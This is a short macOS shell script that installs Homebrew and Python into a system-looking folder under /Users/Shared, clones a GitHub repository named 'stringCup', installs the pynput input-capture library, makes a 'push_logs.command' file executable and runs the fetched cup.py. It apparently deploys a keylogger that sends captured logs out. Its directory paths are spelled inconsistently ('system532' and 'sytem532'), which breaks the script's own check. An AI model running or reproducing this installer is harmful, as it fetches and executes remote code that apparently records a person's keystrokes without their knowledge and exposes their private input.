cd /users/Shared/system532
if [ ! -d "/Users/Shared/sytem532/homebrew" ]; then
  echo "Installing Homebrew..."
  mkdir homebrew
  curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
else
  echo "Homebrew already installed."
fi
export PATH="/Users/Shared/sytem532/homebrew/bin:$PATH"
brew --version
brew install python
python3 --version
pip3 --version
git clone https://github.com/BigJ1m/stringCup.git
pip install pynput
pip3 install pynput
chmod +x /Users/Shared/system532/stringCup/push_logs.command
python3 stringCup/cup.py
